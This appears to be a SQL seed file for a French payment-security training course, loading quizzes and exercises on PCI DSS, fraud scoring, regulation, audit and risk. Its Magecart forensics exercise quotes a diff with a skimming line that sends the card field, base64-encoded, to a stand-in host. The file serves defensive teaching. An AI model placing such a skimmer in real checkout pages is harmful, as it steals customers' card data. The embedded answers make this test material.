-- BLOC 4 – Quizzes and Exercises

-- Quiz 4.1 – PCI DSS
INSERT INTO learning.cursus_quizzes (id, module_id, title, questions, passing_score)
VALUES ('quiz-4.1-pcidss', 'mod-4.1-pcidss', 'Quiz – PCI DSS v4.0.1',
'[
  {"id":"q1","question":"Combien d''exigences principales contient PCI DSS ?","options":["6","10","12","15"],"correct":2,"explanation":"PCI DSS contient 12 exigences principales regroupées en 6 domaines."},
  {"id":"q2","question":"Vrai/Faux : Il est permis de stocker le CVV2 si celui-ci est chiffré.","options":["Vrai","Faux"],"correct":1,"explanation":"Faux : les SAD (CVV, PIN, Track) ne doivent JAMAIS être stockées après autorisation, même chiffrées."},
  {"id":"q3","question":"Qu''est-ce que l''approche personnalisée de PCI DSS v4.0 ?","options":["Utiliser son propre questionnaire","Définir ses propres objectifs de sécurité","Atteindre l''objectif de sécurité de l''exigence avec un contrôle non prescriptif","Ignorer les exigences non applicables"],"correct":2,"explanation":"L''approche personnalisée permet d''utiliser des contrôles alternatifs tant que l''objectif de sécurité est atteint."},
  {"id":"q4","question":"Quel SAQ est le plus réduit ?","options":["SAQ A","SAQ B","SAQ D","SAQ P2PE"],"correct":3,"explanation":"SAQ P2PE (~35 questions) est le plus réduit grâce à la solution P2PE validée."},
  {"id":"q5","question":"L''exigence 6.4.3 impose :","options":["Le chiffrement des bases","L''inventaire des scripts JS sur les pages de paiement","La sauvegarde quotidienne","Le MFA pour les admins"],"correct":1,"explanation":"6.4.3 = inventaire et vérification d''intégrité (SRI) de tous les scripts sur les pages de paiement."}
]'::jsonb, 60) ON CONFLICT (id) DO NOTHING;

-- Quiz 4.2 – Anti-fraude
INSERT INTO learning.cursus_quizzes (id, module_id, title, questions, passing_score)
VALUES ('quiz-4.2-antifraude', 'mod-4.2-antifraude', 'Quiz – Détection de fraude',
'[
  {"id":"q1","question":"Quel type de fraude représente 70% de la fraude carte en France ?","options":["Skimming","CNP (Card Not Present)","Account takeover","Blanchiment"],"correct":1,"explanation":"La fraude CNP (paiements en ligne) représente environ 70% de la fraude carte en France."},
  {"id":"q2","question":"Vrai/Faux : Un autoencoder est un modèle supervisé.","options":["Vrai","Faux"],"correct":1,"explanation":"Faux : l''autoencoder est non supervisé, il apprend la distribution normale et détecte les anomalies."},
  {"id":"q3","question":"Que mesure l''AUC de la courbe ROC ?","options":["Le montant de fraude","La performance globale du modèle de scoring","Le temps de réponse","Le coût de la fraude"],"correct":1,"explanation":"AUC (Area Under Curve) mesure la capacité du modèle à distinguer fraude vs légitime. AUC > 0.95 = excellent."},
  {"id":"q4","question":"Un bot de test de cartes se caractérise par :","options":["Des montants élevés","Une vélocité extrême + montant fixe + taux de refus élevé","Des transactions internationales","Un seul commerçant"],"correct":1,"explanation":"500 TX de 1€ en 2 min, 80% de refus = bot testant des cartes volées."},
  {"id":"q5","question":"Quel KPI anti-fraude mesure les légitimes bloquées à tort ?","options":["TPR","FPR","AUC","Précision"],"correct":1,"explanation":"FPR = False Positive Rate = transactions légitimes bloquées / transactions légitimes totales. Objectif < 2%."}
]'::jsonb, 60) ON CONFLICT (id) DO NOTHING;

-- Quiz 4.3 – Conformité
INSERT INTO learning.cursus_quizzes (id, module_id, title, questions, passing_score)
VALUES ('quiz-4.3-conformite', 'mod-4.3-conformite', 'Quiz – DSP2, RGPD, LCB-FT',
'[
  {"id":"q1","question":"Qu''est-ce qu''un PISP ?","options":["Processeur de paiement","Prestataire d''initiation de paiement","Protocole de sécurité","Programme d''intégration"],"correct":1,"explanation":"PISP = Payment Initiation Service Provider, initie des paiements depuis le compte du client (Open Banking)."},
  {"id":"q2","question":"Le RGPD impose une notification à la CNIL sous :","options":["24h","48h","72h","1 semaine"],"correct":2,"explanation":"72 heures après la découverte d''une violation de données personnelles."},
  {"id":"q3","question":"Qu''est-ce qu''un PEP en LCB-FT ?","options":["Protection Environnement Paiement","Personne Politiquement Exposée","Protocole Échange Paiement","Profil Établissement Partenaire"],"correct":1,"explanation":"PEP = Personne Politiquement Exposée, individu avec fonctions politiques = vigilance renforcée obligatoire."},
  {"id":"q4","question":"DORA s''applique depuis :","options":["2020","2023","Janvier 2025","2027"],"correct":2,"explanation":"DORA (Digital Operational Resilience Act) est en application depuis janvier 2025."},
  {"id":"q5","question":"La DSP2 impose l''ouverture de quelles APIs ?","options":["APIs de trading","APIs d''accès aux comptes (XS2A)","APIs de crédit","APIs internes"],"correct":1,"explanation":"XS2A = Access to Accounts : consultation, initiation de paiement, confirmation de fonds."}
]'::jsonb, 60) ON CONFLICT (id) DO NOTHING;

-- Quiz 4.4 – Audit
INSERT INTO learning.cursus_quizzes (id, module_id, title, questions, passing_score)
VALUES ('quiz-4.4-audit', 'mod-4.4-audit', 'Quiz – Audit & Réponse à incident',
'[
  {"id":"q1","question":"Qu''est-ce qu''un QSA ?","options":["Questionnaire de sécurité","Auditeur certifié PCI SSC","Logiciel de scan","Protocole de test"],"correct":1,"explanation":"QSA = Qualified Security Assessor, auditeur certifié par le PCI SSC pour réaliser les audits PCI DSS."},
  {"id":"q2","question":"Quel outil est utilisé pour intercepter les requêtes HTTP lors d''un pentest web ?","options":["Wireshark","Burp Suite","Nmap","Volatility"],"correct":1,"explanation":"Burp Suite = proxy HTTP/HTTPS pour intercepter, modifier et rejouer les requêtes web."},
  {"id":"q3","question":"Quel est le temps moyen de détection d''une breach selon IBM (2024) ?","options":["24h","30 jours","197 jours","1 an"],"correct":2,"explanation":"197 jours en moyenne pour détecter une breach (IBM Cost of a Data Breach 2024)."},
  {"id":"q4","question":"Les 6 phases NIST de réponse à incident commencent par :","options":["Identification","Préparation","Containment","Notification"],"correct":1,"explanation":"Préparation est la première phase : formation, outils, procédures, contacts avant tout incident."},
  {"id":"q5","question":"Qu''est-ce qu''une attaque Magecart ?","options":["DDoS sur un switch","Injection JS malveillant sur des pages de paiement","Phishing par email","Brute force sur les PIN"],"correct":1,"explanation":"Magecart = injection de JavaScript sur les pages checkout pour voler les données de carte en temps réel."}
]'::jsonb, 60) ON CONFLICT (id) DO NOTHING;

-- Quiz 4.5 – Risques
INSERT INTO learning.cursus_quizzes (id, module_id, title, questions, passing_score)
VALUES ('quiz-4.5-risques', 'mod-4.5-risques', 'Quiz – Gestion des risques',
'[
  {"id":"q1","question":"Combien d''ateliers comporte EBIOS RM ?","options":["3","4","5","6"],"correct":2,"explanation":"EBIOS RM comporte 5 ateliers : cadrage, sources de risques, scénarios stratégiques, opérationnels, traitement."},
  {"id":"q2","question":"Les 4 traitements du risque sont :","options":["Accepter, réduire, transférer, éviter","Identifier, analyser, évaluer, traiter","Prévenir, détecter, corriger, améliorer","Planifier, faire, vérifier, agir"],"correct":0,"explanation":"Accepter (le risque), Réduire (contrôles), Transférer (assurance), Éviter (supprimer l''activité)."},
  {"id":"q3","question":"Qu''est-ce qu''un KRI ?","options":["Key Risk Indicator","Key Response Initiative","Knowledge Resource Index","Known Risk Intelligence"],"correct":0,"explanation":"KRI = Key Risk Indicator, indicateur clé de suivi du risque (taux de fraude, MTTR, conformité)."},
  {"id":"q4","question":"La formule du risque est :","options":["Risque = menace × vulnérabilité","Risque = probabilité × impact","Risque = coût × temps","Risque = fréquence × sévérité"],"correct":1,"explanation":"Risque = probabilité d''occurrence × impact en cas de réalisation."},
  {"id":"q5","question":"Un risque critique est :","options":["Toujours acceptable","Jamais acceptable","Acceptable si documenté","Acceptable après assurance"],"correct":1,"explanation":"Risque critique = jamais acceptable, réduction obligatoire immédiate."}
]'::jsonb, 60) ON CONFLICT (id) DO NOTHING;

-- =============================================================================
-- EXERCISES
-- =============================================================================

INSERT INTO learning.cursus_exercises (id, module_id, title, description, difficulty, exercise_type, instructions, expected_output, hints)
VALUES
('ex-4.1-perimetre', 'mod-4.1-pcidss', 'Définition du périmètre PCI DSS',
'À partir d''un schéma d''architecture, identifiez le CDE et proposez une segmentation.',
'3',
'analysis',
jsonb_build_array($$Architecture d'un commerçant e-commerce :

- **Serveur Web** : page de checkout (collecte PAN)
- **API Backend** : traite la commande, envoie au PSP
- **Base de données** : stocke commandes + PAN chiffré
- **ERP** : gestion des stocks (accès en lecture à la DB)
- **WiFi bureautique** : postes des employés
- **DMZ** : reverse proxy + WAF

Questions :
1. Quels composants sont dans le CDE ?
2. L'ERP est-il dans le périmètre ?
3. Proposez une segmentation réseau
4. Quel SAQ est applicable ?$$),
$$Réponses :

1. **CDE** : Serveur Web + API Backend + Base de données (tous traitent ou stockent le PAN)
2. **ERP** : OUI s'il a accès à la DB contenant les PAN → solution = segmenter ou tokeniser les PAN avant accès ERP
3. **Segmentation** : DMZ (Web) → pare-feu → VLAN CDE (API + DB) → pare-feu → Réseau bureautique (ERP, WiFi)
4. **SAQ D** sauf si le commerçant externalise le traitement du PAN au PSP (iframe/redirect → SAQ A)$$,
'["Le CDE inclut tous les systèmes qui touchent aux données de carte","Un système connecté au CDE est dans le périmètre (sauf segmentation)","La tokenisation peut sortir l''ERP du périmètre","SAQ A = le plus simple si le PAN ne transite jamais par les serveurs du commerçant"]'::jsonb
),

('ex-4.2-scoring', 'mod-4.2-antifraude', 'Conception d''un moteur de scoring',
'Concevez les règles d''un moteur de scoring anti-fraude pour un commerçant en ligne.',
'4',
'practical',
jsonb_build_array($$Contexte : Commerçant vendant de l'électronique en ligne (panier moyen 350 €).

Profil de fraude :
- 60% des fraudes = CNP avec cartes volées
- 25% = account takeover
- 15% = friendly fraud

Concevoir :
1. **10 règles** avec seuils et scores
2. Le **seuil de décision** (accepter/review/refuser)
3. Les **features ML** à intégrer (minimum 8)
4. Le processus de **review manuel** (checklist)$$),
$$Exemple de scoring :

| # | Règle | Score |
|---|-------|-------|
| 1 | Nouveau client + montant > 500 € | +35 |
| 2 | Adresse de livraison ≠ adresse de facturation | +15 |
| 3 | IP étrangère + carte France | +25 |
| 4 | > 2 transactions en 10 min | +30 |
| 5 | Device jamais vu | +20 |
| 6 | Email jetable | +25 |
| 7 | Catégorie à risque (smartphones) | +10 |
| 8 | Heure nocturne (2h-6h) | +10 |
| 9 | Montant exact (pas de centimes) | +5 |
| 10 | Même PAN, adresses de livraison multiples en 24h | +40 |

Seuils : < 30 = accepter, 30-65 = review, > 65 = refuser

Features ML : montant relatif, heure, distance géo, fréquence 1h/24h/7j, device age, email age, shipping vs billing distance, session duration$$,
'["Adapter les règles au profil de fraude spécifique du commerçant","Les seuils doivent être calibrés sur les données historiques","Le review manuel doit vérifier : identité, cohérence, historique","Les features ML doivent être calculables en temps réel"]'::jsonb
),

('ex-4.4-forensics', 'mod-4.4-audit', 'Investigation d''un incident Magecart',
'Analysez les artefacts d''un incident Magecart et reconstituez la timeline.',
'4',
'analysis',
jsonb_build_array($$Artefacts fournis :

**Log serveur web (Apache) :**
```
[2026-01-15 03:22:14] 83.42.x.x PUT /checkout.js 200
[2026-01-15 03:22:15] 83.42.x.x PUT /checkout.js.map 200
```

**Différence du fichier checkout.js :**
```diff
+var img = new Image();
+img.src="https://evil.example.com/collect?d="+btoa(document.querySelector('[name=cc]').value);
```

**Alerte Visa (reçue 2026-02-10) :**
"Compromis probable – 847 cartes signalées frauduleuses, point commun : votre site."

Questions :
1. Reconstituez la timeline complète
2. Identifiez le vecteur d'attaque probable
3. Quelles notifications sont obligatoires et dans quels délais ?
4. Quelles mesures de containment immédiates ?
5. Quelle exigence PCI DSS v4.0.1 aurait pu prévenir ?$$),
$$Timeline :
- J-26 (15/01 03h22) : Modification malveillante de checkout.js depuis IP 83.42.x.x
- J-26 à J0 : Exfiltration silencieuse des données de carte (847+ cartes)
- J0 (10/02) : Alerte Visa, détection
- J+1 : Containment (retrait script, restauration, isolation serveur)
- J+2 : Début forensics
- J+3 : Notification CNIL

Vecteur : Accès FTP/SSH compromis ou CMS non patché → upload du script malveillant

Notifications : CNIL (72h), schémas (immédiat), acquéreur (immédiat), clients (sans délai)

Containment : retirer le script, bloquer l'IP, changer les credentials, scanner la totalité du serveur

Exigence PCI : 6.4.3 (inventaire et SRI des scripts) + 11.6.1 (détection de modifications)$$,
'["Le PUT sur checkout.js est le point d''entrée de l''attaque","btoa() encode en base64 les données de carte pour exfiltration","L''exigence 6.4.3 impose SRI (hash) pour détecter la modification","Les notifications CNIL/schémas/acquéreur sont toutes obligatoires"]'::jsonb
) ON CONFLICT (id) DO NOTHING;
